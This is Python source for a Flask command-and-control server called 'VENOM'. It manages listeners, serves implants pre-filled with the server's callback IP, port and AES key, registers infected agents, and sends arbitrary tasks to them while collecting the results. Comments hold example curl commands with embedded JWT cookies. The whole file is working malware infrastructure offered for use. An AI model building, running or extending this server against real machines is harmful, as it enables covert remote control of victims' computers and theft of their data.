#!/usr/bin/env python3
import re
from flask import *
from argparse import ArgumentParser
from controllers.db import *
from http.server import HTTPServer
from controllers.listener import Listener
from controllers.jwt_utils import *
import time
from threading import Thread
from random import choices, seed
from string import ascii_uppercase, digits
import jwt
import os
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode
import socket as s

''' TO DO: 
1- Implement a one time registration feature (Not yet)
2- Intergrate a good unified success/error handling in all test cases (Not yet)
3- Agent skeletons shall be saved inside the db (Done)
4- Check for redundant listeners (same port)
5- Seperate listener creation and listener run
'''
_SECRET_ = "".join(choices(ascii_uppercase + digits, k=20))

if __name__ == "__main__":

    app = Flask(__name__)
    app.config['MONGODB_SETTINGS'] = {
        'db': 'users',
        'host': 'localhost',
        'port': 27017}

    _LISTENERS_ = dict()
    s = s.socket(s.AF_INET, s.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    @app.route('/', methods=['GET'])
    @token_required(_SECRET_)
    def index():
        return render_template('index.html')

    @app.route('/login', methods=['GET', 'POST'])
    def authenticate():
        if(request.method == 'GET'):
            return render_template('login.html')

        elif(request.method == 'POST'):
            if(login(request.json.get('email'), request.json.get('password'))):
                payload = {
                    'iat': datetime.utcnow(),                          # Current time
                    'exp': datetime.utcnow() + timedelta(minutes=10),  # Expiration time
                    'sub': request.json.get('email')
                }
                access_token = jwt.encode(payload, _SECRET_, algorithm='HS256')
                response = make_response()
                response.set_cookie("accessToken", access_token.decode())
                return response
            else:
                return 'Wrong creds!', 401
        # except:
 #   return 'Some Internal error occured!', 500

    @app.route('/dashboard', methods=['GET'])
    @token_required(_SECRET_)
    def dashboard():
        return 'Dashboard', 200


    # curl http://localhost:1337/listeners -XPOST -H "content-type: application/json" -d '{"action":"create","port":"443"}' -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE5NDY1NTEsImV4cCI6MTY1MTk0NzE1MSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.2Qx4EWUe0DYcp1j4WplNpd0ddJt4L3nF6Mk19I-tl_8"
    @app.route('/listeners', methods=['GET', 'POST'])
    @token_required(_SECRET_)
    def listeners():
        #Make this route POST only
        if(request.method == 'GET'):
            listeners = dict()
            listeners['listeners'] = []
            i = 0 
            for listener in getListeners(): 
                #delete default mongo objectID 
                del listener['_id']
                listeners['listeners'].append(listener)
            return listeners , 200 

        elif (request.method == 'POST'):
            if (request.json.get('action') == 'create' and request.json.get('port')):
                try:
                    id = "".join(choices(digits, k=5))
                    port = int(request.json.get('port'))
                    if not checkListenerPort(port):
                        _LISTENERS_["listener_%s" % id] = HTTPServer(
                            ('0.0.0.0', port), Listener)
                        Key = os.urandom(16)
                        base64_bytes = b64encode(Key)
                        AESKey = base64_bytes.decode("ascii")
                        saveListener(id, port, AESKey)
                        listener = Thread(target=_LISTENERS_["listener_%s" % id].serve_forever)
                        listener.daemon = True
                        listener.start()
                        print(time.asctime(), "Start Server - %s:%s" %
                              ('0.0.0.0', str(request.json.get('port'))))
                        return 'Listener created successfully', 200
                    else:
                        return 'Listener with port %s already created!' % (str(port)), 206
                except:
                    return 'Error while creating a listener!', 206

            elif (request.json.get('action') == 'delete'):
                if(request.json.get('ListenerId') and delListener(request.json.get('ListenerId'))):
                    id = request.json.get('ListenerId')
                    _LISTENERS_["listener_%s" % id].server_close()
                    return 'Listener deleted successfully', 200
                else:
                    return 'No Listener with specified ID found!', 206

        return 'Missing Parameters', 206

    # curl http://localhost:1337/implant -XPOST -H "content-type: application/json" -d '{"id":"26711","type":"linux"}' -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE4NjQ5MTksImV4cCI6MTY1MTg2NTUxOSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.JtTaS9jnmPLBciG4gkt_tviYHNcUUU-jTRAEwo4Qyjg"
    @app.route('/implant', methods=['POST'])
    @token_required(_SECRET_)
    def implant():
        if(request.json.get('type') and request.json.get('id')): 
            try: 
                type = request.json.get('type')
                listenerId = request.json.get('id')
                seed()
                agentID = "".join(choices(digits, k=5))
                port = getListener(listenerId).get('port')
                key = getListener(listenerId).get('key')
                ip = s.getsockname()[0]
                registerAgent(agentID, type, listenerId, ip, port)
                implant = getImplant(type)
                implant = implant.replace('REPLACE_IP', ip).replace(
                    'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
                return Response(implant,  mimetype='application/octet-stream'), 200
            except:
                return 'Listener with ID: %s not found!' % (request.json.get('id')), 206    
        else: 
            return 'Missing Parameters!' , 206
            
    @app.route('/api/getAgentStatusCount/<status>', methods=['GET'])
    @token_required(_SECRET_)
    def getAgentStatusCount(status):
        if(status == '1'): 
            return jsonify({
                "agents": str(db.agents.count_documents({'status': {'$eq': 'alive' }}))
            })
        elif(status == '2'): 
            return jsonify({
                "agents": str(db.agents.count_documents({'status': {'$eq': 'dead' }}))
            })
    
    
    @app.route('/agents', methods=['POST'])
    @token_required(_SECRET_)
    def agents(): 
        status = request.json.get('status')
        agents = dict()
        agents['agents'] = []
        i = 0 
        for agent in getAgents(): 
            #delete default mongo objectID 
            if(agent['status'] != status): 
                continue
            del agent['_id']
            del agent['status'] 
            del agent['task'] 
            del agent['taskResult']
            del agent['bindListenerID'] 
            del agent['serverIP'] 
            del agent['timeout']
            agents['agents'].append(agent)
        return agents , 200 


    @app.route('/venom', methods= ['POST'])
    @token_required(_SECRET_)
    def venom(): 
        if(request.json.get('id') and request.json.get('task')): 
            try: 
                assignTask(request.json.get('id'), request.json.get('task')) 
                #Wait for maximum time to make sure result is sent back by agent.
                time.sleep(20)
                taskResult = readTaskResult(request.json.get('id'))
                if(taskResult): 
                    temp = taskResult
                    clearTaskResult(request.json.get('id')) 
                    return temp
                     
                else: 
                    return 'Agent didn\'t return a response or some error occured', 200
            except: 

                return 'Error!' , 206


    parser = ArgumentParser(description='Welcome to VENOM')
    parser.add_argument('--port', type=int, required=True, default='8080', help='Port number, Default set to 8080')
    args = parser.parse_args()
    migrate()
    app.run(host='0.0.0.0', port=args.port, debug=True)
